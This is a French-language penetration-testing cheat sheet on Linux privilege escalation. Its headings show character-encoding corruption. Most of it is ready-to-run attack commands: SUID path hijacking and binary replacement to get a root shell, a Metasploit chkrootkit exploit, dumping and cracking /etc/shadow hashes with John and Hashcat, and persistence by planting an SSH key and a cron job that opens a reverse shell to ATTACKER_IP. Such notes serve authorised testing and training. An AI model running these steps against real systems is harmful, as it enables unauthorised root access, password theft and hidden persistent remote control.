# üêß √âl√©vation de Privil√®ges Linux

[‚Üê Retour √† la table des mati√®res](../README.md)

## √ânum√©ration Initiale

### Commandes de base pour l'√©num√©ration
```bash
# V√©rifier les privil√®ges sudo de l'utilisateur
sudo -l

# Examiner les t√¢ches cron
cat /etc/crontab
crontab -l
ls -al /etc/cron*

# Trouver tous les fichiers accessibles par l'utilisateur
find / -user {username} 2>/dev/null

# Rechercher les fichiers writables
find / -not -type l -perm -o+w

# √ânum√©rer les services locaux
netstat -antp
netstat -tuln 127.0.0.1

# Informations syst√®me de base
cat /etc/shells
python --version
```

### Shell interactif
```bash
# Obtenir un shell interactif
/bin/bash -i
python -c 'import pty; pty.spawn("/bin/bash")'
```

### G√©n√©rer un mot de passe pour /etc/shadow
```bash
openssl passwd -1 -salt abc password
```

## Kernel Exploits

### Linux Exploit Suggester
```bash
# Avec une session meterpreter active
# 1. T√©l√©charger le script depuis GitHub
wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh

# 2. Upload sur la machine cible
upload /path/to/linux-exploit-suggester.sh

# 3. Ouvrir un shell et ex√©cuter
shell
chmod +x linux-exploit-suggester.sh
./linux-exploit-suggester.sh
```

### Exploitation des CVE trouv√©es
```bash
# Le script liste les exploits et CVE disponibles
# Rechercher les exploits correspondants sur exploit-db.com
# Exemple de workflow :
# 1. Noter les CVE sugg√©r√©es
# 2. Rechercher sur https://www.exploit-db.com/
# 3. T√©l√©charger et compiler l'exploit
# 4. Ex√©cuter pour obtenir root
```

## Exploits Sp√©cifiques

### Chkrootkit (< 0.50)
```bash
# V√©rifier la version de chkrootkit
ps aux | grep check-down

# Si version vuln√©rable d√©tect√©e
use exploit/unix/local/chkrootkit
set SESSION session_id
set CHKROOTKIT /usr/bin/chkrootkit
run
```

## SUID Binaries

### Recherche de binaires SUID
```bash
# Trouver tous les binaires SUID
find / -perm -u=s -type f 2>/dev/null

# Exemple de sortie avec SUID :
# -rwsr-xr-x 1 root root 8344 Sep 23 2022 /usr/bin/welcome
# Le 's' indique le bit SUID activ√©
```

### Analyse d'un binaire SUID
```bash
# Analyser le type de fichier
file /usr/bin/welcome

# Examiner les cha√Ænes de caract√®res
strings /usr/bin/welcome

# Rechercher les appels syst√®me et biblioth√®ques
ltrace /usr/bin/welcome
strace /usr/bin/welcome
```

### Exploitation SUID - Path Hijacking
```bash
# Si le binaire appelle un autre programme sans chemin absolu
# Exemple : le binaire "welcome" appelle "service"

# 1. Cr√©er un faux binaire malveillant
echo '/bin/bash' > /tmp/service
chmod +x /tmp/service

# 2. Modifier le PATH pour inclure /tmp en premier
export PATH=/tmp:$PATH

# 3. Ex√©cuter le binaire SUID
/usr/bin/welcome
# R√©sultat : shell root car welcome s'ex√©cute avec les privil√®ges root
```

### Exploitation SUID - Remplacement de binaire
```bash
# Si un binaire sp√©cifique est appel√© et peut √™tre remplac√©
# Exemple : le binaire appelle /usr/bin/useless

# 1. Sauvegarder l'original (optionnel)
cp /usr/bin/useless /tmp/useless.bak

# 2. Remplacer par une copie de bash
rm /usr/bin/useless
cp /bin/bash /usr/bin/useless

# 3. Ex√©cuter le binaire SUID principal
/usr/bin/welcome
# R√©sultat : shell root
```

## Hash Dumping et Cracking

### R√©cup√©ration des hashes
```bash
# En tant que root, les hashes sont dans /etc/shadow
cat /etc/shadow

# Avec Metasploit (session meterpreter active)
use post/linux/gather/hashdump
set SESSION session_id
run
```

### Cracking avec Metasploit
```bash
# Module de cracking int√©gr√©
use auxiliary/analyze/crack_linux
set SHA512 true
# Ajouter les hashes r√©cup√©r√©s
run
```

### Cracking avec John the Ripper
```bash
# Combiner passwd et shadow
unshadow /etc/passwd /etc/shadow > hashes.txt

# Cracker avec John
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt

# Afficher les mots de passe crack√©s
john --show hashes.txt
```

### Cracking avec Hashcat
```bash
# Identifier le type de hash
hashcat --example-hashes | grep -i sha512

# Cracker (exemple pour SHA512)
hashcat -m 1800 hashes.txt /usr/share/wordlists/rockyou.txt
```

## Persistance

### Ajout de cl√© SSH
```bash
# Cr√©er le r√©pertoire .ssh si n√©cessaire
mkdir -p ~/.ssh

# Ajouter votre cl√© publique
echo "your_public_key" >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys
chmod 700 ~/.ssh
```

### T√¢che cron malveillante
```bash
# Ajouter une t√¢che cron pour la persistance
echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'" | crontab -
```

## Ressources Utiles

- [GTFOBins](https://gtfobins.github.io/) - Bypass de s√©curit√© Unix
- [Reverse Shells](https://revshells.com/) - G√©n√©rateur de reverse shells
